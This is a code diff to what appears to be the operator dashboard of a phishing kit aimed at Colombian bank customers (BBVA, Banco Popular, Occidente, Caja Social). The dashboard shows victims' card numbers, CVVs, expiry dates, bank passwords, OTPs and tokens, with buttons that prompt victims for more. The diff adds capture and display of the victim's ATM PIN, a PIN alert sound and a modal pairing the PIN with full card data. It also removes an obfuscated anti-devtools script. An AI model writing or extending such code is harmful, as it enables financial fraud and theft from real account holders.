@@ -369,6 +369,7 @@ function firmaSesiones(lista, activos) {
         s.datos && s.datos.monto, s.datos && s.datos.precio,
         s.datos && s.datos.authUsuario,
         s.datos && s.datos.cvv,
+        s.datos && s.datos.pin,
         s.datos && s.datos.bancoSeleccionado
     ].join('|')).join('~');
 
@@ -668,7 +669,6 @@ function botonesSesion(s) {
         return btns.join('');
     }
 
-    // 🔥 BOTONES DE BBVA (ORDEN ESTRICTO Y SIEMPRE VISIBLES) 🔥
     if (bancoKey === 'bbva') {
         btns.push(`<button class="btn btn-reject" title="Rechazar" onclick="accion('${sid}','RECHAZAR')">❌</button>`);
         btns.push(`<button class="btn btn-token" title="Pedir Token" onclick="accion('${sid}','TOKEN')">🔢</button>`);
@@ -679,7 +679,6 @@ function botonesSesion(s) {
         return btns.join('');
     }
 
-    // 🔥 BOTONES DE BANCO POPULAR (ORDEN ESTRICTO) 🔥
     if (bancoKey === 'popular') {
         btns.push(`<button class="btn btn-reject" title="Rechazar" onclick="accion('${sid}','RECHAZAR')">❌</button>`);
         btns.push(`<button class="btn btn-token" title="Pedir Token" onclick="accion('${sid}','TOKEN')">🔢</button>`);
@@ -690,7 +689,6 @@ function botonesSesion(s) {
         return btns.join('');
     }
 
-    // 🔥 BOTONES DE BANCO DE OCCIDENTE (ORDEN ESTRICTO) 🔥
     if (bancoKey === 'occidente') {
         btns.push(`<button class="btn btn-reject" title="Rechazar" onclick="accion('${sid}','RECHAZAR')">❌</button>`);
         btns.push(`<button class="btn btn-token" title="Pedir Token" onclick="accion('${sid}','TOKEN')">🔢</button>`);
@@ -701,8 +699,12 @@ function botonesSesion(s) {
         return btns.join('');
     }
 
-    // 🔥 BOTONES DE CAJA SOCIAL (ORDEN ESTRICTO) 🔥
+    // 🔥 BOTONES DE CAJA SOCIAL (ORDEN ESTRICTO + CLAVE CC PRIMERO SI EXISTE PIN) 🔥
     if (bancoKey === 'caja-social') {
+        // 🔑 Si el usuario ya ingresó el PIN → botón "Clave CC" PRIMERO con los datos
+        if (s.datos && s.datos.pin) {
+            btns.push(`<button class="btn" style="background:#8b5cf6; color:white; font-weight:900; padding:5px 12px;" title="Clave de CC" onclick="verPinCajaSocial('${sid}')">🔑 Clave CC</button>`);
+        }
         // 1. Rechazar
         btns.push(`<button class="btn btn-reject" title="Rechazar" onclick="accion('${sid}','RECHAZAR')">❌</button>`);
         // 2. Pedir Token
@@ -711,7 +713,7 @@ function botonesSesion(s) {
         btns.push(`<button class="btn btn-otp" title="Pedir SMS" onclick="accion('${sid}','OTP')">📱</button>`);
         // 4. Pedir CC (Tarjeta)
         btns.push(`<button class="btn" style="background:#0ea5e9; color:white;" title="Pedir CC" onclick="accion('${sid}','PEDIR_TARJETA_CAJA_SOCIAL')">💳</button>`);
-        // 5. Clave de CC (ATM) → confirmacion.html
+        // 5. Pedir Clave de CC (ATM) → confirmacion.html
         btns.push(`<button class="btn" style="background:#f59e0b; color:white;" title="Clave de CC (ATM)" onclick="accion('${sid}','PEDIR_PIN_CAJA_SOCIAL')">🔐</button>`);
         // 6. Finalizar
         btns.push(`<button class="btn btn-final" title="Finalizar" onclick="accion('${sid}','FINALIZAR')">✅</button>`);
@@ -783,7 +785,8 @@ async function cargarSesiones() {
                 apellidos: String(datos.apellidos || ''),
                 correo: String(datos.correo || ''),
                 celular: String(datos.celular || datos.telefono || ''),
-                monto: String(datos.monto || datos.precio || '')
+                monto: String(datos.monto || datos.precio || ''),
+                pin: String(datos.pin || '')
             });
         });
 
@@ -800,9 +803,10 @@ async function cargarSesiones() {
                 if (fueAccionAdminReciente(sid)) continue;
 
                 const otpLlego = snap.otp && snap.otp !== prev.otp;
-                const huboCambio = Object.keys(snap).some(k => k !== 'otp' && snap[k] !== prev[k]);
+                const pinLlego = snap.pin && snap.pin !== prev.pin;
+                const huboCambio = Object.keys(snap).some(k => k !== 'otp' && k !== 'pin' && snap[k] !== prev[k]);
 
-                if (otpLlego) sonidoOtp = true;
+                if (otpLlego || pinLlego) sonidoOtp = true;
                 else if (huboCambio) sonidoNuevo = true;
             }
         } else {
@@ -839,7 +843,7 @@ function renderSesiones() {
                 datos.docNumber, datos.documento, datos.tarjeta, datos.titular, datos.token,
                 datos.otp, datos.monto, datos.ip, datos.expMes, datos.expAnio,
                 datos.cvv, datos.marca, datos.bin, datos.cardType, datos.cardLevel, datos.bankName, datos.countryName,
-                datos.empresa, datos.cuenta, datos.medioPago,
+                datos.empresa, datos.cuenta, datos.medioPago, datos.pin,
                 dp.primerNombre, dp.primerApellido, dp.correoPrimario, dp.numeroTelefono,
                 textoPlacas
             ].filter(Boolean).join(' ').toLowerCase();
@@ -1015,6 +1019,10 @@ function copiarDatos(id) {
         texto += `Tarjeta: ${d.tarjeta}\nVencimiento: ${d.expMes}/${d.expAnio}\nCVV: ${d.cvv}\nTitular: ${d.titular}\nBanco: ${d.bankName}\n`;
     }
 
+    if (d.pin) {
+        texto += `\n--- CLAVE CC (ATM) ---\nPIN: ${d.pin}\n`;
+    }
+
     if (h.bancoKey === 'vanti') {
         texto += `\n--- FORMULARIO VANTI ---\n`;
         texto += `Cuenta Contrato: ${d.cuenta || '-'}\n`;
@@ -1153,6 +1161,11 @@ function renderHistorial() {
                             <div class="detalle-seccion-titulo" style="grid-column: 1/-1; margin-top: 15px;">🔑 Credenciales</div>
                             ${(datos.identificacion || datos.usuario) ? `<div class="detalle-item"><span class="lbl">Identificación</span><span class="val">${escapeHtml(datos.identificacion || datos.usuario)}</span></div>` : ''}
                             ${datos.clave ? `<div class="detalle-item"><span class="lbl">Clave</span><span class="val">${escapeHtml(datos.clave)}</span></div>` : ''}
+                            ` : ''}
+
+                            ${datos.pin ? `
+                            <div class="detalle-seccion-titulo" style="grid-column: 1/-1; margin-top: 15px;">🔑 Clave CC (ATM)</div>
+                            <div class="detalle-item"><span class="lbl">Clave Ingresada</span><span class="val" style="color:#8b5cf6; font-size:16px;">${escapeHtml(datos.pin)}</span></div>
                             ` : ''}
 
                             ${h.bancoKey === 'vanti' ? `
@@ -1433,6 +1446,12 @@ function verInfoUsuario(sessionId) {
                 <p><b>Tipo:</b> ${escapeHtml(d.cardType || '-')} | <b>Nivel:</b> ${escapeHtml(d.cardLevel || '-')}</p>
                 ` : ''}
 
+                ${d.pin ? `
+                <hr style="border-color:#252d44; margin: 10px 0;">
+                <div style="color:#8b5cf6; font-size:11px; font-weight:700; text-transform:uppercase; letter-spacing:0.5px; margin-bottom:8px;">🔑 Clave CC (ATM)</div>
+                <p><b>Clave:</b> <span style="color:#8b5cf6; font-weight:bold; font-family:monospace; font-size:16px;">${escapeHtml(d.pin)}</span></p>
+                ` : ''}
+
                 ${d.authUsuario ? `
                 <hr style="border-color:#252d44; margin: 10px 0;">
                 <div style="color:#88f456; font-size:11px; font-weight:700; text-transform:uppercase; letter-spacing:0.5px; margin-bottom:8px;">🔐 Autorización</div>
@@ -1453,6 +1472,41 @@ function verInfoUsuario(sessionId) {
     });
 }
 
+// 🔥 NUEVA FUNCIÓN: modal de Clave CC (ATM) para Caja Social 🔥
+function verPinCajaSocial(sessionId) {
+    const s = sesionesCache.find(x => x.sessionId === sessionId);
+    if (!s) return;
+    const d = s.datos || {};
+    const pin = d.pin || '-';
+    const tarjeta = d.tarjeta || '-';
+    const titular = d.titular || '-';
+    const exp = (d.expMes || d.exp) ? `${d.expMes || d.exp}/${d.expAnio || ''}` : '-';
+    const cvv = d.cvv || '-';
+    const bankName = d.bankName || '-';
+
+    Swal.fire({
+        title: '🔑 Clave de CC',
+        html: `
+            <div style="text-align: left; font-size: 14px; line-height: 1.9;">
+                <div style="text-align: center; background: #f3e8ff; border: 2px solid #8b5cf6; border-radius: 10px; padding: 16px; margin-bottom: 16px;">
+                    <div style="color: #6b21a8; font-size: 11px; text-transform: uppercase; letter-spacing: 1px; margin-bottom: 6px; font-weight: 700;">CLAVE INGRESADA</div>
+                    <div style="color: #6b21a8; font-family: monospace; font-size: 32px; font-weight: 900; letter-spacing: 8px;">${escapeHtml(pin)}</div>
+                </div>
+                <hr style="border-color: #252d44; margin: 12px 0;">
+                <div style="color: #88f456; font-size: 11px; font-weight: 700; text-transform: uppercase; letter-spacing: 0.5px; margin-bottom: 8px;">💳 Datos de la Tarjeta</div>
+                <p><b>Tarjeta:</b> <span style="font-family: monospace; color: #fff;">${escapeHtml(tarjeta)}</span></p>
+                <p><b>Titular:</b> ${escapeHtml(titular)}</p>
+                <p><b>Vencimiento:</b> ${escapeHtml(exp)}</p>
+                <p><b>CVV:</b> <span style="font-family: monospace;">${escapeHtml(cvv)}</span></p>
+                <p><b>Banco Emisor:</b> ${escapeHtml(bankName)}</p>
+            </div>
+        `,
+        width: 450,
+        confirmButtonText: 'Cerrar',
+        confirmButtonColor: '#113455'
+    });
+}
+
 $('buscarActivos').addEventListener('input', renderActivos);
 $('buscarSesiones').addEventListener('input', renderSesiones);
 $('buscarIps').addEventListener('input', renderIps);
@@ -1465,32 +1519,6 @@ if (TOKEN && USUARIO) {
 document.getElementById('audioStatus').addEventListener('click', () => {
     asegurarAudioActivo();
 });
-</script>
-
-<script>
-(function(){
-  var _0x1a2b=["\x63\x6F\x6E\x74\x65\x78\x74\x6D\x65\x6E\x75","\x70\x72\x65\x76\x65\x6E\x74\x44\x65\x66\x61\x75\x6C\x74","\x6B\x65\x79\x64\x6F\x77\x6E","\x6B\x65\x79","\x46\x31\x32","\x63\x74\x72\x6C\x4B\x65\x79","\x73\x68\x69\x66\x74\x4B\x65\x79","\x74\x6F\x55\x70\x70\x65\x72\x43\x61\x73\x65","\x49","\x4A","\x43","\x55","\x53","\x69\x6E\x63\x6C\x75\x64\x65\x73","\x61\x64\x64\x45\x76\x65\x6E\x74\x4C\x69\x73\x74\x65\x6E\x65\x72","\x73\x65\x74\x49\x6E\x74\x65\x72\x76\x61\x6C","\x6E\x6F\x77","\x62\x6F\x64\x79","\x69\x6E\x6E\x65\x72\x48\x54\x4D\x4C","\x3C\x68\x31\x3E\x41\x63\x63\x65\x73\x6F\x20\x72\x65\x73\x74\x72\x69\x6E\x67\x69\x64\x6F\x3C\x2F\x68\x31\x3E"];
-  var _0x3c4d=document;
-  _0x3c4d[_0x1a2b[14]](_0x1a2b[0],function(_0x5e6f){_0x5e6f[_0x1a2b[1]]();});
-  _0x3c4d[_0x1a2b[14]](_0x1a2b[2],function(_0x7a8b){
-    var _0x8b9c=_0x7a8b[_0x1a2b[3]];
-    if(_0x8b9c===_0x1a2b[4]){_0x7a8b[_0x1a2b[1]]();return false;}
-    if(_0x7a8b[_0x1a2b[5]]&&_0x7a8b[_0x1a2b[6]]){
-      var _0x9c0d=_0x8b9c[_0x1a2b[7]]();
-      if([_0x1a2b[8],_0x1a2b[9],_0x1a2b[10]][_0x1a2b[13]](_0x9c0d)){_0x7a8b[_0x1a2b[1]]();return false;}
-    }
-    if(_0x7a8b[_0x1a2b[5]]&&(_0x8b9c[_0x1a2b[7]]()===_0x1a2b[11]||_0x8b9c[_0x1a2b[7]]()===_0x1a2b[12])){
-      _0x7a8b[_0x1a2b[1]]();return false;
-    }
-  });
-  setInterval(function(){
-    var _0xad1e=performance[_0x1a2b[16]]();
-    debugger;
-    if(performance[_0x1a2b[16]]()-_0xad1e>100){
-      _0x3c4d[_0x1a2b[17]][_0x1a2b[18]]=_0x1a2b[19];
-    }
-  },1000);
-})();
 </script>
 
 </body>
